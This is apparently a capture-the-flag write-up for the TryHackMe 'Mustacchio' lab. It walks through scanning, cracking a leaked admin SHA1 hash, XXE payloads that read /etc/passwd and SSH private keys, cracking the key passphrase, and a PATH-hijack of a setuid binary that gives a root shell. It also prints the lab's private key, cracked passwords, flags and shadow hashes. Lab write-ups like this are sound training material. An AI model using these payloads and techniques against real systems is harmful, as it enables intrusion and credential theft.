# Recon

### Rustscan

```
docker run rustscan/rustscan -a 10.10.32.158 | tee /opt/THM/Mustacchio/1-recon/rustscan_init.md
```

```
Open 10.10.32.158:22
Open 10.10.32.158:80
Open 10.10.32.158:8765
```
### Nmap

```
nmap -vvv -Pn -sC -sV -oN /opt/THM/Mustacchio/1-recon/nmap/nmap_init.md 10.10.32.158
```

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2WTNk2XxeSH8TaknfbKriHmaAOjRnNrbq1/zkFU46DlQRZmmrUP0uXzX6o6mfrAoB5BgoFmQQMackU8IWRHxF9YABxn0vKGhCkTLquVvGtRNJjR8u3BUdJ/wW/HFBIQKfYcM+9agllshikS1j2wn28SeovZJ807kc49MVmCx3m1OyL3sJhouWCy8IKYL38LzOyRd8GEEuj6QiC+y3WCX2Zu7lKxC2AQ7lgHPBtxpAgKY+txdCCEN1bfemgZqQvWBhAQ1qRyZ1H+jr0bs3eCjTuybZTsa8aAJHV9JAWWEYFegsdFPL7n4FRMNz5Qg0BVK2HGIDre343MutQXalAx5P
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCEPDv6sOBVGEIgy/qtZRm+nk+qjGEiWPaK/TF3QBS4iLniYOJpvIGWagvcnvUvODJ0ToNWNb+rfx6FnpNPyOA0=
|   256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGldKE9PtIBaggRavyOW10GTbDFCLUZrB14DN4/2VgyL
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
nmap -p 8765 10.10.32.158 -sV -sC -A
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 04:21 EST
Nmap scan report for 10.10.32.158
Host is up (0.100s latency).

PORT     STATE    SERVICE    VERSION
8765/tcp filtered msi-cps-rm

```

# Enumeration

### WEB

http://10.10.32.158

![[main web.png]]

```
gobuster dir -u http://10.10.32.158:80 -w /usr/share/wordlists/dirb/big.txt -o /opt/THM/Mustacchio/2-enum/web/gob_dir_big.md
```

```
/custom               (Status: 301) [Size: 313] [--> http://10.10.32.158/custom/]
```

![[custom dir.png]]

http://10.10.32.158/custom/js/

![[users.bak web.png]]

```
wget http://10.10.32.158/custom/js/users.bak
```

```
strings users.bak    
```


```                     
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

```
admin
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

https://hashes.com/en/tools/hash_identifier

```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b - Possible algorithms: SHA1
```

luckliy it has already been identified

https://hashes.com/en/decrypt/hash

```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19
```

but for the sake of the process

```
john --wordlist=/usr/share/wordlists/rockyou.txt sqlhashes.md 
```

```
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 512/512 AVX512BW 16x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldog19        (?)     
1g 0:00:00:00 DONE (2024-11-22 04:35) 25.00g/s 17102Kp/s 17102Kc/s 17102KC/s bulldog93..bullcrap1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

```
admin
bulldog19
```

checking out that port found earlier

http://10.10.32.158:8765

![[admin panel web.png]]


we are redirected to a post form

http://10.10.32.158:8765/home.php

![[admin comment web.png]]

# Exploitation

the form seems to send a response of rendered xml

```
xml=%3C%3Fphp+phpinfo%28+%29%3B+%3F%3E
```

```
<!-- Barry, you can now SSH in using your key!-->
```

```
<script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
```


```
http://10.10.32.158:8765/auth/dontforget.bak
```

```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment> 
```

possible users

```
admin
barry
clad
joe
hamd
```


when we paste the message into the form, it renders the xml as a comment

![[demo xml pre.png]]

![[demo xml post.png]]


crafting a malicious palyload

https://portswigger.net/web-security/xxe


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

and we can see /etc/passwd

![[etc passwd.png]]

# Privilege Escalation

### User

system users

```
joe
barry
```

looking for ssh keys


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/joe/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```


![[barry priv key.png]]

we seem to have a private key for barry

```
-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY-----
```

editing it, this is what it should look like

https://phpseclib.com/docs/rsa-keys#encrypted-private-keys

```
-----BEGIN RSA PRIVATE KEY----- 
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----

```

need a password

```
ssh -i barry_rsa barry@10.10.32.158
The authenticity of host '10.10.32.158 (10.10.32.158)' can't be established.
ED25519 key fingerprint is SHA256:8ffSUaKVshwAGNYcOWTbXfy0ik5uNnUqe/0nXK/ybSA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.32.158' (ED25519) to the list of known hosts.
Enter passphrase for key 'barry_rsa':
```


```
john --wordlist=/usr/share/wordlists/rockyou.txt barryhash.md
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (barry_rsa)     
1g 0:00:00:00 DONE (2024-11-22 05:10) 1.086g/s 3228Kp/s 3228Kc/s 3228KC/s urieljr.k..urielfabricio07
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


### Root

```
ssh -i barry_rsa barry@10.10.32.158
urieljames
```

```
barry@mustacchio:~$ whoami
barry
barry@mustacchio:~$ uname -a
Linux mustacchio 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
barry@mustacchio:~$ 
```


/home/barry/user.txt
```
62d77a4d5f97d47c5aa38b3b2651b831
```


we are unable to sudo with that password

looooking in joe's user directory


```
-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log
```

this file is owned by root

file /home/joe/live_log

```
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

strings /home/joe/live_log

```
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
```

```
tail -f /var/log/nginx/access.log
```

the binary is running without a full path

simply proceed to a directory that we have write permissions for, example is the user's home directory that we are (barry)

make a new tail file and set a new $PATH variable


```
cd /home/barry
export PATH=/home/barry:$PATH
nano tail
```

paste into the nano editor
```
#!/bin/bash 
/bin/bash
```


```
chmod 777 tail
/home/joe/live_log
```

we get a root shell

```
root@mustacchio:~# whoami
root
root@mustacchio:~# uname -a
Linux mustacchio 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
root@mustacchio:~# sudo -l
sudo: unable to resolve host mustacchio: Connection refused
Matching Defaults entries for root on mustacchio:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on mustacchio:
    (ALL : ALL) ALL
```

/root/root.txt

```
3223581420d906c4dd1a5f9b530393a5
```


/etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```

/etc/shadow
```
root:*:18739:0:99999:7:::
daemon:*:18739:0:99999:7:::
bin:*:18739:0:99999:7:::
sys:*:18739:0:99999:7:::
sync:*:18739:0:99999:7:::
games:*:18739:0:99999:7:::
man:*:18739:0:99999:7:::
lp:*:18739:0:99999:7:::
mail:*:18739:0:99999:7:::
news:*:18739:0:99999:7:::
uucp:*:18739:0:99999:7:::
proxy:*:18739:0:99999:7:::
www-data:*:18739:0:99999:7:::
backup:*:18739:0:99999:7:::
list:*:18739:0:99999:7:::
irc:*:18739:0:99999:7:::
gnats:*:18739:0:99999:7:::
nobody:*:18739:0:99999:7:::
systemd-timesync:*:18739:0:99999:7:::
systemd-network:*:18739:0:99999:7:::
systemd-resolve:*:18739:0:99999:7:::
systemd-bus-proxy:*:18739:0:99999:7:::
syslog:*:18739:0:99999:7:::
_apt:*:18739:0:99999:7:::
lxd:*:18739:0:99999:7:::
messagebus:*:18739:0:99999:7:::
uuidd:*:18739:0:99999:7:::
dnsmasq:*:18739:0:99999:7:::
sshd:*:18739:0:99999:7:::
pollinate:*:18739:0:99999:7:::
vagrant:$6$rxWldag3$UH9F1UZhDQEKKleaid9QNzH7n1uDIJgdnGP01X5lwo4HAAO292zKrLCM5Gk1j5g4sacRoNR2b790HUGSNA/Wn.:18739:0:99999:7:::
joe:$6$Knz6FBbL$UEDnt.pkH6ZEDf/R4cJMLXP36diGxbnUoocdFrYWRybQ58DOP9kE4vgcU9CZXQ2e/l/HQ8UZFrQXsZTB8ZYPy1:18790:0:99999:7:::
barry:$6$230tFyKx$W3A2JMRqNrW2bFT/XsCNoPNDlTjxlqAkmLSyC9EHxRLLce8AlHQWwidzC.SSVIqzB64.zLjUTMWgrrfv0UqjG0:18790:0:99999:7:::
```
